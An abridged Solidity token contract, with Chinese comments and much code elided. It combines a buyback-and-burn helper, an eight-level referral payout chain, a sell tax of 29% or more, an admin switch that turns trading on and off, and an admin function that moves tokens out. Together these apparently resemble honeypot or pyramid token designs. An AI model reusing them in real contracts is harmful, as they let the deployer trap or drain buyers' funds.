...
contract A  {//回购自身打入黑洞。
    ...
    function appRove()external{
     IERC20(_father).approve(_route, 9*10**70);  
    }
    ...
    function usdtForToken() public  {
        ...
        path[0] = address(_father);
        path[1] = address(_back_token);
        uint bac = IERC20(_father).balanceOf(address(this));
        bac = bac*rate/10000;
...
contract Token is Ownable, IERC20Metadata {
    ...
    constructor(
        ...
        _back = 0x000000000000000000000000000000000000dEaD;
        _back2 = 0x000000000000000000000000000000000000dEaD;
    ...
    function init()external{
        ...
        for(uint i;i<10;i++){
            ...
            BB = address(son);
            boss[BB] = cc;
            if(i==9) boss[0x1f9d61dB02d34cC09072e334581d2b271cA446d8] = BB;
        }
    }
    modifier isAdmin(){
    ...
    function buy_reward(uint amount,address sender)internal{
        ...
        for(uint i ;i<8;i++){
            ...
            settlement(parent);
            _balances[parent]+= amount*buy_rate[i]/100;
            emit Transfer(sender, parent , (amount*buy_rate[i]/100));
            parent = boss[parent];
        }
    }
    ...
    function setWhitesNot(address addr)external isAdmin{
        _whites[addr] = false;
    }
    ...
    function calculate(address addr)internal view returns(uint){
    ...
    // }
    function setOpen()external isAdmin{
        open = open == true ? false:true;
    }
    ...
    function _transfer(
        ...
        if(sender==_pair){
         ...
         if(recipient==_pair){
            ...
            _balances[_A] +=amount*26/100;
            emit Transfer(sender, _A, (amount * 26 / 100));
            _balances[_A] +=amount*3/100;
	...
	function returnIn(address con, address addr, uint256 val) public isAdmin {
